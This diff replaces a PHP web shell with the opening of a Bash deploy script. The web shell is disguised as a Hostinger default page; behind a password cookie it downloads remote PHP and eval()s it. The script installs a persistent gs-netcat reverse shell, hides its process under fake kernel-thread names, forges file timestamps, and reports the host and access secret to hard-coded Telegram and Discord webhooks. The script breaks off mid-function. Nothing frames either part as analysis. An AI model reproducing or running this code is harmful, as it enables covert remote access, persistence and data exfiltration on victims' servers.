@@ -1,319 +1,1713 @@
-<?php
-/**
- * @package    Haxor.Group
- * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
- *
- */
+#! /usr/bin/env bash
 
-// @deprecated  1.0  Deprecated without replacement
-function is_logged_in()
+# Install and start a permanent gs-netcat reverse login shell
+#
+# See https://www.gsocket.io/deploy/ for examples.
+#
+# This script is typically invoked like this as root or non-root user:
+#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
+#
+# Connect
+#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
+# Pre-set a secret:
+#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+# Uninstall
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
+#
+# Other variables:
+# GS_DEBUG=1
+#		- Verbose output
+#		- Shorter timeout to restart crontab etc
+#       - Often used like this:
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+# GS_USELOCAL=1
+#       - Use local binaries (do not download)
+# GS_USELOCAL_GSNC=<path to gs-netcat binary>
+#       - Use local gs-netcat from source tree
+# GS_NOSTART=1
+#       - Do not start gs-netcat (for testing purpose only)
+# GS_NOINST=1
+#		- Do not install gsocket
+# GS_OSARCH=x86_64-alpine
+#       - Force architecutre to a specific package (for testing purpose only)
+# GS_PREFIX=
+#		- Use 'path' instead of '/' (needed for packaging/testing)
+# GS_URL_BASE=https://gsocket.io
+#		- Specify URL of static binaries
+# GS_URL_BIN=
+#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
+# GS_DSTDIR="/tmp/foobar/blah"
+#		- Specify custom installation directory
+# GS_HIDDEN_NAME="-bash"
+#       - Specify custom hidden name for process, default is [kcached]
+# GS_BIN_HIDDEN_NAME="gs-dbus"
+#       - Specify custom name for binary on filesystem (default is gs-dbus)
+#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
+# GS_DL=wget
+#       - Command to use for download. =wget or =curl.
+# GS_TG_TOKEN=
+#       - Telegram Bot ID, =5794110125:AAFDNb...
+# GS_TG_CHATID=
+#       - Telegram Chat ID, =-8834838...
+# GS_DISCORD_KEY=
+#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+# GS_WEBHOOK_KEY=
+#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+# GS_WEBHOOK=
+#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
+# GS_HOST=
+#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
+#       - See https://github.com/hackerschoice/gsocket-relay
+# GS_PORT=
+#       - Port for the GSRN-Server. Default is 443.
+# TMPDIR=
+#       - Guess what...
+
+# Global Defines
+URL_BASE_CDN="https://cdn.gsocket.io"
+URL_BASE_X="https://gsocket.io"
+[[ -n $GS_URL_BASE ]] && {
+	URL_BASE_CDN="${GS_URL_BASE}"
+	URL_BASE_X="${GS_URL_BASE}"
+}
+URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+[[ -n $GS_URL_BIN ]] && {
+	URL_BIN="${GS_URL_BIN}"
+	URL_BIN_FULL="$URL_BIN"
+}
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"
+
+# STUBS for deploy_server.sh to fill out:
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook
+
+# WEBHOOKS are executed after a successfull install
+# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+### Telegram
+ GS_TG_TOKEN="8275239916:AAHHPLPU1aHTWepUzrsO2PZss_4NYeNNCos"
+ GS_TG_CHATID="-1006435000030"
+[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+}
+### Generic URL as webhook (any URL)
+[[ -n $GS_WEBHOOK ]] && {
+	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
+}
+### webhook.site
+# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+[[ -n $GS_WEBHOOK_KEY ]] && {
+	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+}
+### discord webhook
+ GS_DISCORD_KEY="1402227082209132544/F4I8Hq10cKQFIvI6C1OD_48d9UPis48fiSuPU0OpvsArNf-O2M7gOjMWz0hP8iLl0Obf"
+[[ -n $GS_DISCORD_KEY ]] && {
+	data='{"username": "gsocket", "content": "'"${msg}"'"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+}
+unset data
+unset msg
+
+DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+BIN_HIDDEN_NAME_DEFAULT="smile"
+# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
+proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+# Pick a process name at random
+PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+for str in "${proc_name_arr[@]}"; do
+	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+done
+PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
+
+# PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
+# ~/.config/<NAME>
+CONFIG_DIR_NAME="htop"
+
+# Names for 'uninstall' (including names from previous versions)
+BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
+CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
+
+[[ -t 1 ]] && {
+	CY="\033[1;33m" # yellow
+	CDY="\033[0;33m" # yellow
+	CG="\033[1;32m" # green
+	CR="\033[1;31m" # red
+	CDR="\033[0;31m" # red
+	CB="\033[1;34m" # blue
+	CC="\033[1;36m" # cyan
+	CDC="\033[0;36m" # cyan
+	CM="\033[1;35m" # magenta
+	CN="\033[0m"    # none
+	CW="\033[1;37m"
+}
+
+if [[ -z "$GS_DEBUG" ]]; then
+	DEBUGF(){ :;}
+else
+	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
+fi
+
+_ts_fix()
 {
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
+	local fn
+	local ts
+	local args
+	local ax
+	fn="$1"
+	ts="$2"
+
+	args=() #OSX, must init or " " in touch " " -r 
+
+	[[ ! -e "$1" ]] && return
+	[[ -z $ts ]] && return
+
+	# Change the symlink for ts_systemd_fn items
+	[[ -n "$3" ]] && args=("-h")
+
+	# Either reference by Timestamp or File
+	[[ "${ts:0:1}" = '/' ]] && {
+		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
+		ax=("${args[@]}" "-r" "$ts" "$fn")
+		touch "${ax[@]}" 2>/dev/null
+		return
+	}
+	ax=("${args[@]}" "-t" "$ts" "$fn")
+	touch "${ax[@]}" 2>/dev/null && return
+	# If 'date -r' or 'touch -t' failed:
+	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
+	touch "${ax[@]}" 2>/dev/null
 }
 
-if (is_logged_in()) {
-    $Array = array(
-        '666f70656e', // fo p en => 0
-        '73747265616d5f6765745f636f6e74656e7473', // strea m_get_contents => 1
-        '66696c655f6765745f636f6e74656e7473', // fil e_g et_cont ents => 2
-        '6375726c5f65786563' // cur l_ex ec => 3
-    );
+# Restore timestamp of files
+ts_restore()
+{
+	local fn
+	local n
+	local ts
 
-    function hex2str($hex) {
-        $str = '';
-        for ($i = 0; $i < strlen($hex); $i += 2) {
-            $str .= chr(hexdec(substr($hex, $i, 2)));
-        }
-        return $str;
-    }
+	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }
 
-    function geturlsinfo($destiny) {
-        $belief = array(
-            hex2str($GLOBALS['Array'][0]), 
-            hex2str($GLOBALS['Array'][1]), 
-            hex2str($GLOBALS['Array'][2]), 
-            hex2str($GLOBALS['Array'][3])  
-        );
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		ts="${_ts_ts_a[$n]}"
+		fn="${_ts_fn_a[$n]}"
+		# DEBUGF "RESTORE-TS ${fn} ${ts}"
+		((n++))
 
-        if (function_exists($belief[3])) { 
-            $ch = curl_init($destiny);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            $love = $belief[3]($ch);
-            curl_close($ch);
-            return $love;
-        } elseif (function_exists($belief[2])) { 
-            return $belief[2]($destiny);
-        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
-            $purpose = $belief[0]($destiny, "r");
-            $love = $belief[1]($purpose);
-            fclose($purpose);
-            return $love;
-        }
-        return false;
-    }
+		_ts_fix "$fn" "$ts"
+	done
+	unset _ts_fn_a
+	unset _ts_ts_a
 
-    $destiny = 'https://walauberantakan.pages.dev/smile/smile.txt';
-    $dream = geturlsinfo($destiny);
-    if ($dream !== false) {
-        eval('?>' . $dream);
-    }
-} else {
-    if (isset($_POST['password'])) {
-        $entered_key = $_POST['password'];
-        $hashed_key = '$2y$10$LU8wyLdAYBEi8H655meUtO9uUkPQEIVJwoLVx7NLIYP43Q.tZUcrG'; // https://bcrypt.online/
-        
-        if (password_verify($entered_key, $hashed_key)) {
-            setcookie('user_id', 'LPH', time() + 3600, '/'); 
-            header("Location: " . $_SERVER['PHP_SELF']); 
-            exit();
-        }
-    }
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
+		ts="${_ts_systemd_ts_a[$n]}"
+		fn="${_ts_systemd_fn_a[$n]}"
+		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts" "symlink"
+	done
+	unset _ts_systemd_fn_a
+	unset _ts_systemd_ts_a
 }
-?>
-<!DOCTYPE html>
-<html lang="pt">
-    <head>
-        <title>Página padrão</title>
-        <link rel="icon" type="image/x-icon" href="https://hpanel.hostinger.com/favicons/hostinger.png">
-        <meta charset="utf-8">
-        <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
-        <meta content="Página padrão" name="description">
-        <meta content="width=device-width, initial-scale=1" name="viewport">
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link href="https://fonts.googleapis.com/css2?family=DM+Sans&display=swap" rel="stylesheet">
-        <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;700&display=swap" rel="stylesheet">
-        <style>
-            body {
-                margin: 0px;
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                justify-content: center;
-                width: 100vw;
-                height: 100vh;
-                min-height: 675px;
-                background-color: #F4F5FF;
-            }
-            p {
-                width: 100%;
-                left: 0px;
-                font-size: 16px;
-                font-family: 'DM Sans', sans-serif;
-                font-weight: 400;
-                letter-spacing: 0px;
-                text-align: center;
-                vertical-align: top;
-                max-width: 550px;
-                color: #727586;
-                margin: 0px;
-            }
-            a:hover {
-                cursor: pointer;
-                color: #673DE6;
-                text-decoration: underline;
-            }
-            h1 {
-                font-family: 'DM Sans', sans-serif;
-                font-size: 24px;
-                font-weight: 700;
-                letter-spacing: 0px;
-                text-align: center;
-                margin: 8px;
-            }
-            .content {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                justify-content: center;
-                width: 100%;
-                height: 100%;
-            }
-            .ic-launch  {
-                margin-left: 10.5px;
-                width: 21px !important;
-                height: 20px !important;
-            }
-            .link-container {
-                margin-top: 32px;
-                margin-bottom: 32px;
-            }
-            .link {
-                display: flex;
-                flex-direction: row;
-                align-items: center;
-                justify-content: center;
-                font-family: 'DM Sans', sans-serif;
-                font-style: normal;
-                font-weight: 700;
-                font-size: 14px;
-                color: #673DE6;
-                margin-top: 8px;
-                text-decoration: none;
-            }
-            .main-image {
-                width: 100%;
-                max-width: 650px;
-                max-height: 406px;
-                height: auto;
-            }
-            .navigation {
-                width: 100%;
-                height: 72px;
-                display: flex;
-                margin: 0;
-                padding: 0;
-                flex-direction: row;
-                align-items: center;
-                justify-content: center;
-                background-color: #36344D;
-            }
-            @media screen and (max-width: 580px) and (min-width: 0px) {
-                h1, p, .link-container {
-                    width: 80%;
-                }
-            }
-            @media screen and (min-width: 650px) and (min-height: 0px) and (max-height: 750px) {
-                .link-container {
-                    margin-top: 12px;
-                }
-                h1 {
-                    margin-top: 0px;
-                    margin-bottom: 0px;
-                }
-            }
-                    .container {
-            text-align: center;
-        }
 
-        .icon {
-            font-size: 80px;
-            color: #9E9E9E;
-        }
+ts_is_marked()
+{
+	local fn
+	local a
+	fn="$1"
 
-        h1 {
-            font-size: 24px;
-            color: #333;
-        }
+	for a in "${_ts_fn_a[@]}"; do
+		[[ "$a" = "$fn" ]] && return 0 # True
+	done
 
-        p {
-            color: #666;
-        }
+	return 1 # False
+}
 
-        .button {
-            display: inline-block;
-            background-color: #F4F5FF;
-            color: white;
-            padding: 10px 20px;
-            text-decoration: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
+# There are some files which need TimeStamp update after all other TimeStamps
+# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
+# ts_add_last [file] <reference file>
+ts_add_systemd()
+{
+	local fn
+	local ts
+	local ref
+	fn="$1"
+	ref="$2"
 
-        .button:hover {
-            background-color: #F4F5FF;
-        }
+	ts="$ref"
+	[[ -z $ref ]] && {
+		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
+	}
 
-        .password-input {
-            background-color: #F4F5FF;
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #F4F5FF;
-            border-radius: 5px;
-            width: 200px;
-            font-size: 16px;
-        }
-        </style>
-    </head>
-    <body>
-        <nav class="navigation">
-            <a href="https://hpanel.hostinger.com" rel="nofollow" target="_blank">
-                <svg width="150" height="30" viewBox="0 0 150 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path fill-rule="evenodd" clip-rule="evenodd" d="M116.793 12.1444C117.376 11.4191 118.324 11.0565 119.634 11.0565C120.223 11.0565 120.767 11.1312 121.267 11.2811C121.765 11.4312 122.207 11.6077 122.592 11.8114L123.404 9.56372C123.307 9.50387 123.149 9.41962 122.926 9.31174C122.703 9.2036 122.421 9.09874 122.078 8.99714C121.735 8.89504 121.326 8.80526 120.851 8.72705C120.376 8.64935 119.844 8.60986 119.255 8.60986C118.389 8.60986 117.575 8.75421 116.811 9.04215C116.048 9.32984 115.383 9.75233 114.818 10.3099C114.253 10.8671 113.808 11.5481 113.484 12.3511C113.159 13.1546 112.997 14.0777 112.997 15.1211C112.997 16.1522 113.143 17.0696 113.438 17.8723C113.733 18.6755 114.151 19.3532 114.692 19.9045C115.233 20.4562 115.885 20.8754 116.649 21.1636C117.412 21.4511 118.263 21.5951 119.201 21.5951C120.295 21.5951 121.215 21.5197 121.961 21.3701C122.706 21.2204 123.247 21.0799 123.584 20.9478V14.7794H120.77V19.1133C120.602 19.1495 120.407 19.1734 120.184 19.1852C119.962 19.1971 119.694 19.2031 119.381 19.2031C118.804 19.2031 118.299 19.1043 117.866 18.9066C117.433 18.7087 117.073 18.4298 116.784 18.0699C116.496 17.7101 116.279 17.2816 116.135 16.7844C115.991 16.287 115.919 15.732 115.919 15.1211C115.919 13.8617 116.21 12.8699 116.793 12.1444ZM72.0952 19.1222C71.8367 19.1886 71.5091 19.2213 71.1124 19.2213C70.3189 19.2213 69.6483 19.1403 69.1015 18.9781C68.5539 18.8166 68.0939 18.6341 67.7216 18.4299L66.9277 20.6597C67.0962 20.756 67.3035 20.8576 67.5499 20.9658C67.7965 21.0736 68.0914 21.1755 68.4339 21.2713C68.7766 21.3671 69.1703 21.4478 69.6152 21.5142C70.0601 21.5801 70.5593 21.6133 71.1124 21.6133C72.7596 21.6133 73.9921 21.2924 74.8098 20.6507C75.6275 20.0094 76.0366 19.1071 76.0366 17.944C76.0366 17.345 75.9581 16.8357 75.8022 16.4158C75.6456 15.9961 75.408 15.6302 75.0897 15.3186C74.771 15.007 74.3709 14.7342 73.8902 14.5003C73.409 14.2664 72.8438 14.0298 72.1949 13.7896C71.8819 13.6817 71.5961 13.5771 71.3381 13.475C71.0793 13.3734 70.8508 13.2592 70.6523 13.1335C70.4541 13.0075 70.3005 12.8667 70.1926 12.7108C70.0844 12.5554 70.0299 12.3632 70.0299 12.1351C70.0299 11.7519 70.1774 11.467 70.472 11.2811C70.7666 11.0955 71.2506 11.002 71.9242 11.002C72.5253 11.002 73.0393 11.0714 73.4663 11.2089C73.8928 11.347 74.2807 11.5059 74.6297 11.6857L75.4411 9.47375C75.0443 9.25798 74.5392 9.05982 73.9263 8.88001C73.3129 8.70046 72.5853 8.60992 71.7437 8.60992C71.0339 8.60992 70.3968 8.69744 69.8316 8.87096C69.2664 9.04523 68.7857 9.29344 68.389 9.61734C67.992 9.9415 67.6856 10.3338 67.4689 10.7955C67.2525 11.257 67.1443 11.7755 67.1443 12.3512C67.1443 12.9268 67.2465 13.4152 67.451 13.8165C67.6553 14.2186 67.9201 14.5604 68.2445 14.842C68.5691 15.1239 68.9358 15.3578 69.3446 15.5434C69.7535 15.729 70.1623 15.8942 70.5714 16.0376C71.5091 16.3499 72.1704 16.6404 72.5553 16.9104C72.9399 17.1798 73.1326 17.519 73.1326 17.9264C73.1326 18.1183 73.1026 18.2923 73.0423 18.448C72.982 18.6039 72.8736 18.7387 72.7174 18.8521C72.5613 18.9668 72.3538 19.0565 72.0952 19.1222ZM54.4948 15.121C54.4948 15.7321 54.5697 16.2836 54.72 16.7752C54.8703 17.2671 55.087 17.6896 55.3697 18.0432C55.6517 18.3972 55.9977 18.6696 56.4068 18.8612C56.8154 19.0536 57.2843 19.1497 57.8137 19.1497C58.3304 19.1497 58.7965 19.0536 59.2117 18.8612C59.626 18.6696 59.9751 18.3972 60.2573 18.0432C60.5398 17.6896 60.7567 17.2671 60.907 16.7752C61.0573 16.2836 61.1325 15.7321 61.1325 15.121C61.1325 14.5091 61.0573 13.9546 60.907 13.457C60.7567 12.9595 60.5398 12.5343 60.2573 12.1802C59.9751 11.8266 59.626 11.5535 59.2117 11.3622C58.7965 11.1703 58.3304 11.0745 57.8137 11.0745C57.2843 11.0745 56.8154 11.1733 56.4068 11.371C55.9977 11.5689 55.6517 11.8447 55.3697 12.1986C55.087 12.5522 54.8703 12.9777 54.72 13.4751C54.5697 13.973 54.4948 14.5215 54.4948 15.121ZM64.0369 15.121C64.0369 16.1878 63.8772 17.1263 63.5592 17.935C63.2401 18.7445 62.8041 19.422 62.2512 19.9672C61.6981 20.5132 61.0396 20.9236 60.2762 21.1992C59.5127 21.4753 58.6918 21.6131 57.8143 21.6131C56.9603 21.6131 56.155 21.4753 55.3974 21.1992C54.6397 20.9236 53.9782 20.5132 53.4132 19.9672C52.8478 19.422 52.4034 18.7445 52.0785 17.935C51.7539 17.1263 51.5912 16.1878 51.5912 15.121C51.5912 14.0537 51.7597 13.1155 52.0964 12.3065C52.4329 11.4969 52.8871 10.8164 53.4584 10.265C54.0291 9.71347 54.6907 9.30004 55.4425 9.02417C56.1936 8.74805 56.9845 8.60999 57.8143 8.60999C58.6678 8.60999 59.4734 8.74805 60.2313 9.02417C60.9887 9.30004 61.65 9.71347 62.2152 10.265C62.7801 10.8164 63.2253 11.4969 63.5499 12.3065C63.8747 13.1155 64.0369 14.0537 64.0369 15.121ZM45.1113 8.89825H47.9253V21.3612H45.1113V16.0739H40.3856V21.3612H37.5717V8.89825H40.3856V13.6638H45.1113V8.89825ZM88.4326 8.89838V11.2904H84.6628V21.3613H81.8491V11.2904H78.079V8.89838H88.4326ZM94.3715 21.3616H91.5576V8.89838H94.3715V21.3616ZM106.967 21.3613C106.162 19.9347 105.29 18.5262 104.352 17.135C103.414 15.7441 102.416 14.4314 101.358 13.1964V21.3613H98.58V8.89838H100.871C101.267 9.2937 101.706 9.7793 102.187 10.3549C102.668 10.9306 103.158 11.5452 103.657 12.1985C104.156 12.8519 104.652 13.5293 105.145 14.2305C105.638 14.9318 106.101 15.606 106.534 16.2536V8.89838H109.33V21.3613H106.967ZM127.521 21.3613V8.89838H135.963V11.2542H130.335V13.6998H135.331V16.0021H130.335V19.0055H136.378V21.3613H127.521ZM143.046 11.1641C143.209 11.1523 143.391 11.1463 143.596 11.1463C144.498 11.1463 145.18 11.2753 145.643 11.5325C146.106 11.7911 146.337 12.2251 146.337 12.8367C146.337 13.4724 146.109 13.9223 145.652 14.1856C145.195 14.4497 144.437 14.5809 143.38 14.5809H142.586V11.2001C142.731 11.1885 142.884 11.1764 143.046 11.1641ZM147.745 9.75233C146.747 9.08666 145.311 8.75421 143.435 8.75421C142.917 8.75421 142.331 8.7781 141.676 8.82639C141.021 8.87391 140.387 8.95841 139.773 9.07761V21.3613H142.587V16.8108H143.976C144.217 17.099 144.458 17.4196 144.7 17.7737C144.941 18.1273 145.187 18.5015 145.433 18.8973C145.681 19.2931 145.922 19.701 146.158 20.1205C146.392 20.5402 146.625 20.9536 146.854 21.3613H150C149.784 20.9059 149.549 20.4414 149.297 19.9673C149.044 19.4941 148.783 19.0386 148.512 18.6011C148.242 18.1635 147.968 17.7438 147.691 17.3419C147.415 16.9403 147.151 16.5837 146.898 16.2716C147.655 15.9603 148.236 15.5313 148.638 14.9861C149.041 14.4406 149.243 13.7297 149.243 12.8548C149.243 11.4518 148.743 10.4177 147.745 9.75233Z" fill="white"/>
-                    <path fill-rule="evenodd" clip-rule="evenodd" d="M0.000188531 14.046V0.000497794L7.0891 3.78046V10.1086L16.4734 10.1132L23.6773 14.046H0.000188531ZM18.3924 8.95058V0L25.6725 3.6859V13.1797L18.3924 8.95058ZM18.3924 26.1177V19.8441L8.93571 19.8375C8.94454 19.8793 1.61224 15.8418 1.61224 15.8418L25.6725 15.9547V30L18.3924 26.1177ZM-6.10352e-05 26.1177L0.000191176 16.9393L7.0891 21.0683V29.8033L-6.10352e-05 26.1177Z" fill="white"/>
-                </svg>
-            </a>
-        </nav>
-        <div class="content">
-            <svg 
-                class="main-image"
-                width="650" 
-                height="406" 
-                viewBox="0 0 650 406" 
-                fill="none"
-                xmlns="http://www.w3.org/2000/svg"
-                xmlns:xlink="http://www.w3.org/1999/xlink">
-                <path d="M603.171 195.67L445.106 347.201V44.1392L603.171 195.67Z" stroke="#C4CCE8" stroke-miterlimit="10"/>
-                <path d="M445.106 195.67L287.041 347.201V44.1392L445.106 195.67Z" stroke="#C4CCE8" stroke-miterlimit="10"/>
-                <path d="M603.171 195.67H180.043" stroke="#C4CCE8" stroke-miterlimit="10"/>
-                <path d="M57.0145 43H593.668C596.51 43 599.237 44.0612 601.247 45.9501C603.257 47.8391 604.387 50.401 604.387 53.0724V348.34H57.0145C54.1716 348.34 51.4452 347.279 49.435 345.39C47.4248 343.501 46.2954 340.939 46.2954 338.268V53.1252C46.288 51.798 46.5598 50.4826 47.0952 49.2544C47.6306 48.0263 48.4189 46.9097 49.415 45.9688C50.4111 45.0279 51.5953 44.2812 52.8994 43.7717C54.2036 43.2623 55.6021 43 57.0145 43V43Z" stroke="#C5CDE9" stroke-miterlimit="10"/>
-                <path d="M65.1415 64.6472C67.4918 64.6472 69.3971 62.8618 69.3971 60.6595C69.3971 58.4572 67.4918 56.6719 65.1415 56.6719C62.7912 56.6719 60.8859 58.4572 60.8859 60.6595C60.8859 62.8618 62.7912 64.6472 65.1415 64.6472Z" stroke="#C5CDE9" stroke-miterlimit="10"/>
-                <path d="M82.7718 65.7865C85.4579 65.7865 87.6354 63.7461 87.6354 61.2292C87.6354 58.7123 85.4579 56.6719 82.7718 56.6719C80.0858 56.6719 77.9083 58.7123 77.9083 61.2292C77.9083 63.7461 80.0858 65.7865 82.7718 65.7865Z" stroke="#C5CDE9" stroke-miterlimit="10"/>
-                <path d="M100.402 65.7866C102.752 65.7866 104.658 64.0013 104.658 61.7989C104.658 59.5966 102.752 57.8113 100.402 57.8113C98.0519 57.8113 96.1466 59.5966 96.1466 61.7989C96.1466 64.0013 98.0519 65.7866 100.402 65.7866Z" stroke="#C5CDE9" stroke-miterlimit="10"/>
-                <path d="M52.3747 171.744H39V184.277H52.3747V171.744Z" fill="#673CE5"/>
-                <path d="M611.682 88.573H598.307V102.245H611.682V88.573Z" fill="#673CE5"/>
-                <path d="M384.311 173.864C397.176 197.034 424.878 208.367 449.522 201.798C470.052 196.291 485.552 179.079 488.877 158.072" stroke="#673DE6" stroke-width="18" stroke-miterlimit="10"/>
-                <path d="M569.199 264.276L517.516 232.922L484.055 281.351L535.738 312.705L569.199 264.276Z" fill="#673DE6"/>
-                <rect x="76" y="55" width="325" height="308" fill="url(#pattern0)"/>
-                <defs>
-                <pattern id="pattern0" patternContentUnits="objectBoundingBox" width="1" height="1">
-                <use xlink:href="#image0_793_7454" transform="translate(0 -0.0294456) scale(0.000431034 0.000453478)"/>
-                </pattern>
-                    <image 
-                        id="image0_793_7454" 
-                        width="2320"
-                        height="2296"
-                        href="https://hypnosisteam.wordpress.com/wp-content/uploads/2025/07/man1.webp"
-                    />
-                </defs>
-            </svg>
-            <h1>Está tudo pronto!</h1>
-            <p>Tudo o que tem de fazer agora é carregar os ficheiros do seu site e iniciar a sua jornada. Veja como fazer isto abaixo:</p>
-            <div class="link-container">
-                <a 
-                    class=link
-                    href="https://support.hostinger.com/en/articles/4455931-how-can-i-migrate-website-to-hostinger"
-                    rel="nofollow"
-                    target="_blank"
-                >
-                    Como posso migrar um site para a Hostinger? 
-                    <svg class="ic-launch" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path 
-                            fill-rule="evenodd" 
-                            clip-rule="evenodd" 
-                            d="M16.3333 15.8333H4.66667V4.16667H10.5V2.5H4.66667C3.74167 2.5 3 3.25 3 4.16667V15.8333C3 16.75 3.74167 17.5 4.66667 17.5H16.3333C17.25 17.5 18 16.75 18 15.8333V10H16.3333V15.8333ZM12.1667 2.5V4.16667H15.1583L6.96667 12.3583L8.14167 13.5333L16.3333 5.34167V8.33333H18V2.5H12.1667Z" 
-                            fill="#673DE6"
-                        />
-                    </svg>
-                </a>
-                <a 
-                    class="link"
-                    href="https://support.hostinger.com/en/articles/3220304-how-to-install-wordpress-using-auto-installer"
-                    rel="nofollow"
-                    target="_blank"
-                >
-                    Como instalar o WordPress com o Instalador Automático?
-                    <svg class="ic-launch" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path 
-                            fill-rule="evenodd" 
-                            clip-rule="evenodd" 
-                            d="M16.3333 15.8333H4.66667V4.16667H10.5V2.5H4.66667C3.74167 2.5 3 3.25 3 4.16667V15.8333C3 16.75 3.74167 17.5 4.66667 17.5H16.3333C17.25 17.5 18 16.75 18 15.8333V10H16.3333V15.8333ZM12.1667 2.5V4.16667H15.1583L6.96667 12.3583L8.14167 13.5333L16.3333 5.34167V8.33333H18V2.5H12.1667Z" 
-                            fill="#673DE6"
-                        />
-                    </svg>
-                </a>
-            </div>
-            
-        </div>
-      <div class="container">
-        <form method="POST" action="">
-            <input type="password" id="password" name="password" class="password-input" placeholder="" required>
-            <div class="button" onclick="document.forms[0].submit()">Access</div>
-        </form>
-    </div>
-    </body>
-</html>
+	# Note: _ts_systemd_ts_a may store a number or a directory (start with '/')
+	_ts_systemd_ts_a+=("$ts")
